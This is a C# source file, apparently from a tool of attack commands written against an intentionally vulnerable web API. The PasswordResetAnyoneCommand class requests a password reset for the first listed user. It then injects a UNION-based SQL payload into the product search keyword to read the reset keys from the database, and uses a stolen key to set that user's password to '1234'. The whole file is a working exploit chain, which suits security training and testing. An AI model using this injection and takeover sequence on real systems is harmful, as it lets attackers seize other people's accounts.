using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Flurl.Http;

public class PasswordResetAnyoneCommand : BaseBadCommand
{
    //      public class PasswordResetRequest
    //    {
    //       public int ID { get; set; }
    //       public string key { get; set; }
    //       public string email { get; set; }
    //       public string password { get; set; }
    //       public string passwordConfirmation { get; set; }
    //       public DateTime createdAt { get; set; }
    //       public DateTime updatedAt { get; set; }
    //    }

    // Products class
    // public int ID { get; set; }
    // public string name { get; set; }
    // public string description { get; set; }
    // public string skuId { get; set; }
    // public int unitPrice { get; set; }
    // public string imageUrl;
    // public string category;
    public override async Task<bool> ExecuteAsync(BadApiSession session, CancellationToken token = default)
    {
        // for now - just do the first user
        await new ListUsersCommand().ExecuteAsync(session, token);

        var users = (List<ApiUser>)session.SessionData[ListUsersCommand.KeyAllUsers];
        var user = users[0];

        // PUT api/passwordresets - create the key against an email
        // we need to get a "resetkey" into the database against the user we want to reset 
        var json = new { email = user.Email };
        var resetResult = await session.WithAuthenticatedEndpoint("passwordresets").PostJsonAsync(json, token);

        Console.WriteLine("Reset request send: {0}", await resetResult.GetStringAsync());

        // GET: api/products/search 
        // is an interesting endpoind, as allows interrogation of what's we've got in the database via this query
        // var query = $"SELECT * From Products WHERE name LIKE '%{keyword}%' OR description LIKE '%{keyword}%'";
        // f%' UNION ALL SELECT 100, email, [key], '-', 0 FROM PasswordResetRequests ---
        var getResetsQuery = "a%' UNION ALL SELECT -1, email, [key], '-', 0 FROM PasswordResetRequests ---";        
        var productsAndResets = await session.WithAuthenticatedEndpoint("products/search").SetQueryParam("keyword", getResetsQuery).GetJsonListAsync(token);
        var onlyResets = productsAndResets.Where(x => x.id == -1).ToList();
        foreach (var reset in onlyResets)
        {
            Console.WriteLine("Reset: key={0} - email={1}", reset.name, reset.description);
        }

        // PUT: api/passwordresets - execute the change
        var resetJson = new
        {
            key = onlyResets.First().name,
            email = user.Email,
            password = "1234",
            passwordConfirmation = "1234"
        };

        var resetPassword = await session.WithAuthenticatedEndpoint("passwordresets").PutJsonAsync(resetJson, token);
        
        Console.WriteLine("Password reset result: {0}", await resetPassword.GetStringAsync());

        return true;
    }


}